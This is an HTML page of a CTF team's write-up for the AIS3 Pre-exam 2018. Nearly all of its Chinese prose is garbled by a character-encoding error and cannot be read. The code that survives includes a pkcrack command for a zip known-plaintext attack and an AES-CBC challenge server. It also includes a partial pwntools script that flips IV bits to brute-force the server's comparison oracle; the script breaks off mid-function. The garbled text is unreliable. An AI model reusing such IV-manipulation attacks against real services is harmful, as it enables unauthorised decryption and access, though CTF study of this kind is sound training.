<!doctype html>
<!--
Modified from https://www.codeply.com/go/7XYosZ7VH5
-->
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>AIS3 Pre-exam 2018</title>
    <link type="text/css" rel="stylesheet" href="assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="assets/css/hljs-github.min.css"/>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css" integrity="sha384-Zug+QiDoJOrZ5t4lssLdxGhVrurbmBWopoEl+M6BdEfwnCJZtKxi1KgxUyJq13dy" crossorigin="anonymous">
    <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/js/bootstrap.min.js" integrity="sha384-a5N7Y/aK3qNeh15eJKGWxsqtnX/wWdSZSKp+81YjTmS15nvnvxKHuzaWwXHDli+4" crossorigin="anonymous"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }

  </style>
  
  <script>
// https://stackoverflow.com/a/48330533
$(window).on('activate.bs.scrollspy', function (event) {
  let active_collapse = $($('.list-group-item.active').parents()[0]);
  $(".collapse").removeClass("show");
  active_collapse.addClass("show");

  let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
  $('a[href^="#submenu"]').css("border-left", "");
  parent_menu.css("border-left","#e69138 solid 4px");
});

// http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [['$','$'], ['\\(','\\)']],
    processEscapes: true
  }
});

  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">balsn / ctf_writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
          <!-- This menu is hidden in bigger devices with d-sm-none. 
            The sidebar isn't proper for smaller screens imo, so this dropdown menu can keep all the useful sidebar itens exclusively for smaller screens  -->
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                rev
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#misc-1">misc-1</a>
    
                <a class="dropdown-item" href="#misc-2">misc-2</a>
    
                <a class="dropdown-item" href="#misc-3">misc-3</a>
    
                <a class="dropdown-item" href="#misc-4">misc-4</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#web-1">web-1</a>
    
                <a class="dropdown-item" href="#web-2">web-2</a>
    
                <a class="dropdown-item" href="#web-3">web-3</a>
    
                <a class="dropdown-item" href="#web-4">web-4</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#crypto-1">crypto-1</a>
    
                <a class="dropdown-item" href="#crypto-2">crypto-2</a>
    
                <a class="dropdown-item" href="#crypto-3-(unsolved,-thanks-to-@how2hack)">crypto-3-(unsolved,-thanks-to-@how2hack)</a>
    
                <a class="dropdown-item" href="#crypto-4">crypto-4</a>
    
              </div>
            </li>
    
            <!-- Smaller devices menu END -->
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <!-- NavBar END -->
    <!-- Bootstrap row -->
    <div class="row" id="body-row">
      <!-- Sidebar -->
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <!-- d-* hiddens the Sidebar in smaller devices. Its itens can be kept on the Navbar 'Menu' -->
        <!-- Bootstrap List Group -->
        <ul class="list-group sticky-top sticky-offset">
          <!-- Menu with submenu -->
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">rev</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#misc-1" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">misc-1</span>
            </a>
    
<a href="#misc-2" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">misc-2</span>
            </a>
    
<a href="#misc-3" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">misc-3</span>
            </a>
    
<a href="#misc-4" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">misc-4</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#web-1" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">web-1</span>
            </a>
    
<a href="#web-2" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">web-2</span>
            </a>
    
<a href="#web-3" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">web-3</span>
            </a>
    
<a href="#web-4" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">web-4</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#crypto-1" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">crypto-1</span>
            </a>
    
<a href="#crypto-2" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">crypto-2</span>
            </a>
    
<a href="#crypto-3-(unsolved,-thanks-to-@how2hack)" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">crypto-3-(unsolved,-thanks-to-@how2hack)</span>
            </a>
    
<a href="#crypto-4" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">crypto-4</span>
            </a>
    
          </div>
    
          <!-- Separator with title -->
        </ul>
        <!-- List Group END-->
      </div>
      <!-- sidebar-container END -->

      <!-- MAIN -->
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="ais3-pre-exam-2018"><a class="header-link" href="#ais3-pre-exam-2018"></a>AIS3 Pre-exam 2018</h1>
<p><a href="https://ais3.org/">AIS3 (Advanced Information Security Summer School)</a> is a cyber security course in Taiwan. Therefore this writeup will be written in Chinese:)</p>
<p>By @bookgin, @sces60107</p>
<p>And thanks to @how2hack for the writeup of crypto 3!</p>
<h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
<p>@sces60107 ç ´è‡ºï¼Œä½†å¤ªå¿™æ²’ç©ºå¯«xD</p>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<p>@sces60107 å¤ªå¿™æ²’ç©ºå¯«ä¹Ÿæ²’ç©ºæ‰“xD</p>
<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
<h3 id="misc-1"><a class="header-link" href="#misc-1"></a>Misc 1</h3>
<p>çœ‹é¡Œç›®ä¸­çµ¦çš„å½±ç‰‡å°±æœ‰ flag äº†ã€‚</p>
<h3 id="misc-2"><a class="header-link" href="#misc-2"></a>Misc 2</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹åœ–ç‰‡ï¼Œæƒ³è¾¦æ³•æ‰¾ flagã€‚<img src="https://i.imgur.com/7O4997q.jpg" alt=""></p>
<p>åœ–ä¸€çœ‹å°±çŸ¥é“æ˜¯å‡ flagï¼Œä½†é‚„æ˜¯æ‰‹è³¤å‚³äº†ä¸€ä¸‹ç„¶å¾Œè¢« server å—† incorrect (é€™æ¬¡çš„è§£é¡Œå¹³å°é‚„æœƒç´€éŒ„ flag éŒ¯èª¤æ¬¡æ•¸XD)ï¼Œå†ä¾†å°±æ˜¯åœ–ç‰‡åˆ†æèµ·æ‰‹å¼ <a href="https://github.com/zardus/ctf-tools/tree/master/stegsolve">stegsolve</a>ï¼Œä¹Ÿæ²’ä»€éº¼æ±è¥¿ï¼Œè€Œä¸”é€™æ¬¡ä¸€å¼µè¶…ç³Šçš„ jpgã€‚</p>
<p>çœ‹ä¾†ä¸æ˜¯è—åœ¨åœ–ç‰‡ä¸­ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯ strings, binwalk, foremostï¼Œç”¨binwalk/foremost å¯ä»¥æŠ½å‡ºä¸€å€‹ zip æª”ï¼Œä½†æ˜¯é€™å€‹ zip è¢«åŠ å¯†äº†ã€‚</p>
<p>é›–ç„¶ zip æœ‰è¢«åŠ å¯†ï¼Œä½†æ˜¯æª”åã€è³‡æ–™å¤¾çµæ§‹ã€æª”æ¡ˆå¤§å°æ²’æœ‰åŠ å¯†ï¼Œæˆ‘å€‘ç™¼ç¾è£¡é¢æœ‰ <code>backup/Avengers_Infinity_War_Poster.jpg</code> è·Ÿ <code>backup/flag</code> ï¼Œé€™å¼µ Avengers Infinity War Poster æŠŠæª”æ¡ˆåç¨±ä¸Šç¶²æœå°‹ï¼Œå¯ä»¥æ‰¾åˆ° <a href="https://kk.wikipedia.org/wiki/%D0%A1%D1%83%D1%80%D0%B5%D1%82:Avengers_Infinity_War_poster.jpg">wiki</a> æœ‰ä¸€å¼µæª”æ¡ˆåç¨±ä¸€æ¨£çš„ï¼Œé€£å¤§å°éƒ½ä¸€æ¨£ï¼Œåœ¨<a href="https://upload.wikimedia.org/wikipedia/kk/archive/4/4d/20180606151139%21Avengers_Infinity_War_poster.jpg">é€™è£¡ã€‚</a></p>
<p>zip æœ‰ä¸€ç¨®æ”»æ“Šå«åš known-plaintext attackï¼Œåœ¨å·²çŸ¥éƒ¨ä»½æ˜æ–‡çš„æƒ…æ³ä¸‹ï¼Œå¯ä»¥ç®—å‡ºå£“ç¸®æª”æ¡ˆçš„å¯†ç¢¼ï¼Œé€™å€‹åœ¨<a href="https://www.30cm.tw/2015/08/ctf-ais3-write-up.html">æŸä¸€å¹´ ais3 pre-exam ä¹Ÿå‡ºé</a>ï¼Œç”¨ pkcrack å°±å¯ä»¥è§£é–‹ã€‚</p>
<p>æŠŠæ˜æ–‡çš„ zip è·Ÿè·¯å¾‘å¼„å¥½ä¹‹å¾ŒåŸ·è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œå¾—åˆ°å¯†ç¢¼ç‚º <code>asdfghjkl;</code></p>
<pre class="hljs"><code>./pkcrack -C flag.zip -c <span class="hljs-string">"backup/Avengers_Infinity_War_Poster.jpg"</span> -P plain.zip -p <span class="hljs-string">"backup/Avengers_Infinity_War_Poster.jpg"</span></code></pre><p>è§£é–‹ zip å¾Œå¾—åˆ° flag <code>AIS3{NONONONONONONONONONONO}</code>ï¼Œä½†ä½ ä»¥ç‚ºé€™æ¨£å°±çµæŸäº†å—ï¼ŸéŒ¯ï¼Œé€™å€‹ flag æ˜¯å‡çš„ï¼Œé€åˆ°è§£é¡Œå¹³è‡ºåªæœƒå¾’å¢ incorrect flag çš„æ¬¡æ•¸ã€‚</p>
<p>ç„¶å¾Œæˆ‘å°±å¡åœ¨é€™è£¡ï¼Œå˜—è©¦åœ¨å°åŸæœ¬çš„åœ–ç‰‡åšæ›´è©³ç´°çš„åˆ†æã€å° zip åšè©³ç´°æª¢æŸ¥æœ‰æ²’æœ‰è—æ±è¥¿ï¼Œä½†éƒ½ä¸€ç„¡æ‰€ç²ï¼Œçœ‹è‘—è§£é¡Œäººæ•¸æœ‰äºŒä¸‰åäººï¼Œæ‡‰è©²æ˜¯å¾ˆç°¡å–®çš„æ–¹å‘ï¼Œé€™å€‹ zip known-plaintext attack å»ä¸æ˜¯ flag......</p>
<p>æœ€å¾Œä¸»è¾¦å–®ä½çµ¦å‡ºäº† hintï¼Œå°è±¡ä¸­æ˜¯å«æˆ‘å€‘æ³¨æ„  <code>AIS3{Not_this_one}</code> ç¬¬ä¸€å€‹å‡ flag çš„ä¸‹æ–¹ï¼Œè«‹å„ä½ä»”ç´°å›å»çœ‹ä¸Šé¢é‚£å¼µåœ–å­—çš„ä¸‹æ’ï¼Œä½ æœƒç™¼ç¾è·Ÿä¸Šé¢æ˜é¡¯ä¸å°ç¨±ã€‚@sces60107 å¾ˆå¿«ç™¼ç¾é€™æ˜¯æ‘©æ–¯å¯†ç¢¼ï¼Œæˆ‘é‚„åœ¨çœ¼èŠ±çœ‹è‘—é«˜å£“ç¸®åº¦çš„ jpg ä¸çŸ¥é“æ‘©æ–¯å¯†ç¢¼åœ¨å“ªè£¡ï¼Œçœ‹äº†å¤§æ¦‚äº”åˆ†é˜æ‰çœ‹å‡ºä¾†ï¼Œé€™å¯†ç¢¼è§£å‡ºä¾†å°±æ˜¯çœŸçš„ flag äº†ã€‚</p>
<p>æœ¬é¡Œéå¸¸å…·æœ‰é‡‘ç›¾ççš„æ°´æº–ã€‚</p>
<p>åœ¨é¡Œç›®è£¡é¢æ”¾å‡çš„ flag æ˜¯é‚„å¥½ï¼Œä½†é€™å€‹ zip known-plaintext attack çš„å‡ flagï¼Œè®“äººåé›¢æ­£è¦è§£æ³•å¤ªé ï¼Œé€™æ¨£å‡ºé¡Œä¸¦ä¸æ˜¯å¾ˆæ°ç•¶ã€‚</p>
<h3 id="misc-3"><a class="header-link" href="#misc-3"></a>Misc 3</h3>
<p>é¡Œç›®çµ¦ä¸€å€‹ mp3 éŸ³æ¨‚æª”ï¼Œè½ä¸Šå»å°±æ˜¯ä¸€å€‹äººåœ¨æ¸…å”±æ­Œæ›²ã€‚</p>
<p>åˆæ­¥ strings, binwalk, foremost éƒ½æ‰¾ä¸å‡ºä»»ä½•æœ‰ç”¨çš„æ±è¥¿ã€‚é€²ä¸€æ­¥å°±æ˜¯ç”¨ audacity/sonic visualizer é–‹èµ·ä¾†çœ‹æ³¢å½¢è·Ÿ spectrogramï¼Œä½†ä¹Ÿæ²’ä»€éº¼ç‰¹åˆ¥çš„ã€‚</p>
<p>é€™æ¨£å¤§è‡´å¯ä»¥çŒœæ¸¬é€™é¡Œå¯èƒ½æ˜¯ç”¨æŸäº›å°ˆæ¥­çš„ audio stego çš„è»Ÿé«”ä¾†åšçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“é‚£ä¸€æ¬¾ï¼Ÿ</p>
<p>ä¾†è©¦è©¦çœ‹ Google <code>svega.mp3</code> ï¼Œæ²’æœ‰ä»€éº¼æ”¶ç©«......ï¼ˆä½† @sces60107 ä¸€æœå°‹ç¬¬ä¸€å€‹å°±æ˜¯ mp3stegoï¼Œæˆ‘çŒœå¯èƒ½æ˜¯ Google é è¨­èªè¨€/å€‹äººåå¥½è¨­å®šä¸åŒï¼Œå°è‡´çµæœå·®å¾ˆå¤šï¼‰</p>
<p>é‚£é€™æ¨£åªèƒ½æœ‰é»ç„¡è…¦çš„æš´åŠ›å˜—è©¦å¸¸è¦‹çš„ Audio Stego è»Ÿé«”äº†ï¼Œè©¦äº†<a href="https://github.com/DominicBreuker/stego-toolkit">ä¸€äº›</a>éƒ½æ²’æ•ˆï¼Œé€£ <a href="http://www.petitcolas.net/steganography/mp3stego/">mp3stego</a> éƒ½è©¦éäº†ï¼ˆç”¨defaultçš„å¯†ç¢¼ passï¼‰ï¼Œä½†ä»”ç´°æƒ³æƒ³è¦ºå¾— mp3stego é‚„æ˜¯æœ€æœ‰å¯èƒ½çš„ï¼Œå› ç‚ºä»–æ˜¯æˆ‘å”¯ä¸€æ‰¾åˆ° mp3 æ ¼å¼çš„ stego è»Ÿé«”ï¼Œä½†éœ€è¦å¯†ç¢¼æ‰èƒ½è§£é–‹ã€‚</p>
<p>ä¹‹å‰å˜—è©¦ default çš„å¯†ç¢¼ <code>PASS</code>ï¼Œå¯†ç¢¼éŒ¯èª¤ï¼Œé‚£ä¾†è©¦ä¸€ä¸‹å¯†ç¢¼ç©ºç™½å‘¢ï¼Ÿæœç„¶è§£å¯†æˆåŠŸæ‹¿åˆ° flag ã€‚</p>
<h3 id="misc-4"><a class="header-link" href="#misc-4"></a>Misc 4</h3>
<p>é€™é¡Œæœ‰é»å¯æƒœï¼Œæˆ‘è³½å¾Œååˆ†é˜æ‰è§£å‡ºä¾†ï¼Œé ç«¯çš„ nc å¯¦åœ¨æ˜¯å¤ªæ…¢äº† XD</p>
<p>å…ˆé™„ä¸Š server çš„ codeï¼š</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode

key = os.urandom(<span class="hljs-number">16</span>)
answer = int.from_bytes(os.urandom(<span class="hljs-number">16</span>), <span class="hljs-string">'big'</span>)

<span class="hljs-keyword">with</span> open(<span class="hljs-string">"flag"</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> data:
    flag = data.read().strip()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(text)</span>:</span>
    iv, text = text[:<span class="hljs-number">16</span>], text[<span class="hljs-number">16</span>:]
    aes = AES.new(key, AES.MODE_CBC, iv)
    <span class="hljs-keyword">return</span> aes.decrypt(text)

print(<span class="hljs-string">"===== Welcome to number game ====="</span>)

<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    number = decrypt(b64decode(input(<span class="hljs-string">"guess : "</span>).strip()))[:<span class="hljs-number">16</span>]
    number = int.from_bytes(number, <span class="hljs-string">'big'</span>)
    <span class="hljs-keyword">if</span> number &gt; answer: print(<span class="hljs-string">"Too big"</span>)
    <span class="hljs-keyword">elif</span> number &lt; answer: print(<span class="hljs-string">"Too small"</span>)
    <span class="hljs-keyword">else</span>: print(flag)</code></pre><p>é¡Œç›®æœƒæœ‰ä¸€å€‹ç­”æ¡ˆï¼Œç„¶å¾Œä½ å¯ä»¥çµ¦ä»–ä¸€å€‹æ•¸å­—ï¼Œé€é CBC çš„ç‰¹æ€§æ”¹ IV èƒ½å¤ ç¿»è½‰ä¸åŒ bitï¼Œserver æœƒå‘Šè¨´ä½ ä½ çš„æ•¸å­—æ¯”ä»–å¤§é‚„æ˜¯æ¯”ä»–å°ï¼Œå¦‚æœä¸€æ¨£å°±å¯ä»¥æ‹¿åˆ° flagï¼Œç¸½å…±æœ‰ 128 bitsã€‚</p>
<p>é¦–å…ˆå…ˆæƒ³ä¸€ä¸‹ï¼Œæˆ‘å€‘æœ‰æ©Ÿæœƒ bit by bit çŒœå—ï¼Ÿ</p>
<p>å¦‚æœç¬¬ä¸€å€‹ bit è¢«æˆ‘å€‘çŒœä¸­äº†ï¼Œé‚£æˆ‘å€‘åœ¨é€éç¿»è½‰å‰©ä¸‹çš„ 127 bitsï¼Œå¿…å®šå¯ä»¥æ‰¾åˆ°å…©çµ„æ•¸å­—ï¼Œä¸€çµ„æ¯”ç­”æ¡ˆå¤§ï¼Œä¸€çµ„æ¯”ç­”æ¡ˆå°ï¼›ç›¸åçš„å¦‚æœæˆ‘å€‘ç¬¬ä¸€å€‹ bit å°±çŒœéŒ¯ï¼Œé‚£ç„¡è«–æ€éº¼ç¿»è½‰å‰©ä¸‹çš„ bitsï¼Œéƒ½åªæœƒæ†æ¯”ç­”æ¡ˆå¤§ï¼Œæˆ–æ˜¯æ†æ¯”ç­”æ¡ˆå°ã€‚</p>
<p>èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘ä¸€æ¬¡ç¿»å…©å€‹ bitsï¼Œå³ [00, 01] èˆ‡ [10, 11]ï¼Œå¦‚æœå…¶ä¸­æœ‰ä¸€çµ„å‡ºç¾ä¸€å¤§ä¸€å°ï¼Œé‚£æˆ‘å€‘å¯ä»¥ç¢ºå®šè©²çµ„çš„ç¬¬ä¸€å€‹ bit æ˜¯å°çš„ã€‚å¦‚æœæ²’æœ‰ä¸€çµ„å‡ºç¾ä¸€å¤§ä¸€å°ï¼Œåªå¥½ä¸€æ¬¡ç¿»ä¸‰å€‹ bitsï¼Œå³ [000, 001], [010, 011], [100,101], [110,111]ï¼Œé€™å››çµ„ä¹‹ä¸­è‹¥æœ‰ä¸€çµ„å‡ºç¾ä¸€å¤§ä¸€å°ï¼Œé‚£æˆ‘å€‘å¯ä»¥ç¢ºå®šè©²çµ„çš„å‰å…©å€‹ bits æ˜¯å°çš„ã€‚</p>
<p>é‚£ worse case çš„è¤‡é›œåº¦å‘¢ï¼Ÿå‡è¨­ç­”æ¡ˆæ˜¯ 1 ï¼Œæˆ‘å€‘åŸæœ¬çŒœæ¸¬çš„æ•¸å­—æ˜¯ 0ï¼Œé‚£é€™å€‹æƒ…æ³è¦åˆ°ä¸€æ¬¡ç¿»å‰127 bits æ™‚ï¼ŒæŸä¸€çµ„å‡ºç¾ [00000...0, 00000...1]ï¼Œæ‰æœƒç™¼ç¾ä¸€å¤§ä¸€å°ï¼Œé€™å€‹ worse case å¯æ˜¯æœ‰è‘— è¦ç¿» $2^{128}$ æ¬¡æ‰èƒ½ç™¼ç¾........</p>
<p>é€²ä¸€æ­¥è€ƒæ…® worse case ç™¼ç”Ÿçš„æƒ…æ³ï¼Œæœƒç™¼ç¾å…¶å¯¦æ²’é€™éº¼å®¹æ˜“ç™¼ç”Ÿï¼Œåœ¨ç­”æ¡ˆéš¨æ©Ÿçš„æƒ…æ³ä¸‹ï¼Œéœ€è¦ä¸€æ¬¡ç¿» 10 å€‹ bits çš„ç™¼ç”Ÿæ©Ÿç‡ç‚º $ 2^{-9}$ ï¼ˆéœ€è¦è€ƒæ…® 0 èˆ‡ 1 çš„ç‹€æ³ï¼‰ï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨ä¸Šè¿°æ–¹æ³•ä¾†çŒœæ¯å€‹ bit äº†ã€‚ </p>
<p>è§£é¡Œ script å¯«çš„å¾ˆé†œï¼Œå› ç‚ºè§£é¡Œçš„çš„ç•¶ä¸‹æœ‰ä¸€æ®µæ™‚é–“æ²’æœ‰å¥½å¥½ç¡è¦ºäº†XD</p>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># Python 3.6.5</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> string, os
<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product

chars = string.digits + string.ascii_letters

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PoW</span><span class="hljs-params">(prefix)</span>:</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> product(*[chars <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>)]):
        x = prefix + <span class="hljs-string">''</span>.join(i)
        sha256 = hashlib.sha256()
        sha256.update(x.encode())
        <span class="hljs-keyword">if</span> sha256.hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">'000000'</span>:
            <span class="hljs-keyword">return</span> x
    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"Unfortunately, PoW not found."</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64</span><span class="hljs-params">(n)</span>:</span>
    <span class="hljs-keyword">return</span> base64.b64encode(n.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">'big'</span>) + <span class="hljs-string">b'SlowpokeIsCute&lt;3'</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isSmall</span><span class="hljs-params">(n)</span>:</span>
    <span class="hljs-comment">#print(s.recvuntil(b': '))</span>
    s.sendline(b64(n))
    r = s.recvuntil(<span class="hljs-string">'\n'</span>).decode()
    <span class="hljs-keyword">if</span> <span class="hljs-string">'AIS3'</span> <span class="hljs-keyword">in</span> r:
        print(r)
        exit(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'small'</span> <span class="hljs-keyword">in</span> r

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p</span><span class="hljs-params">(n)</span>:</span>
    print(<span class="hljs-string">'{:0128b}'</span>.format(n))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(n, idx, prefix_bits=<span class="hljs-number">0</span>)</span>:</span> <span class="hljs-comment"># BFS</span>
    <span class="hljs-keyword">if</span> (prefix_bits == <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> prefix_bits &gt; idx): <span class="hljs-comment"># oh we fail</span>
        print(<span class="hljs-string">'fail'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
    <span class="hljs-keyword">assert</span> n &amp; ((<span class="hljs-number">1</span>&lt;&lt;(idx+<span class="hljs-number">1</span>))<span class="hljs-number">-1</span>) == <span class="hljs-number">0</span>
